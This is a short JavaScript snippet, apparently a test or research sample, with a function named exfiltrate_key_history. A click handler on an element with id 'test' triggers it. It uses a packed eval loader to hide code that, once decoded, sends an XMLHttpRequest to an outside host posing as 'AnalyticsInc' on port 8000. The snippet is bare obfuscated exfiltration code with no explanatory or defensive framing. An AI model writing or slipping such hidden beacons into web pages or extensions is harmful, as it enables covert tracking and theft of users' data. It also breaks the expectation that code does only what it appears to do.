function exfiltrate_key_history() {
  var _0x1636 = ['0=5 4();0.7("3","1://2:6/8.d?c=b",9);0.a(e);', "|", "split", "xmlhttp|http|AnalyticsInc|GET|XMLHttpRequest|new|8000|open|submission|true|send|multi|test|html|null", "replace", "", "\\w+", "\\b", "g"];
  eval(function(_0x9e37x1, _0x9e37x2, _0x9e37x3, _0x9e37x4, _0x9e37x5, _0x9e37x6) {
    _0x9e37x5 = function(_0x9e37x3$$1) {
      return _0x9e37x3$$1.toString(36);
    };
    if (!_0x1636[5][_0x1636[4]](/^/, String)) {
      for (;_0x9e37x3--;) {
        _0x9e37x6[_0x9e37x3.toString(_0x9e37x2)] = _0x9e37x4[_0x9e37x3] || _0x9e37x3.toString(_0x9e37x2);
      }
      _0x9e37x4 = [function(_0x9e37x5$$1) {
        return _0x9e37x6[_0x9e37x5$$1];
      }];
      _0x9e37x5 = function() {
        return _0x1636[6];
      };
      _0x9e37x3 = 1;
    }
    for (;_0x9e37x3--;) {
      if (_0x9e37x4[_0x9e37x3]) {
        _0x9e37x1 = _0x9e37x1[_0x1636[4]](new RegExp(_0x1636[7] + _0x9e37x5(_0x9e37x3) + _0x1636[7], _0x1636[8]), _0x9e37x4[_0x9e37x3]);
      }
    }
    return _0x9e37x1;
  }(_0x1636[0], 15, 15, _0x1636[3][_0x1636[2]](_0x1636[1]), 0, {}));
}
document.getElementById("test").onclick = exfiltrate_key_history
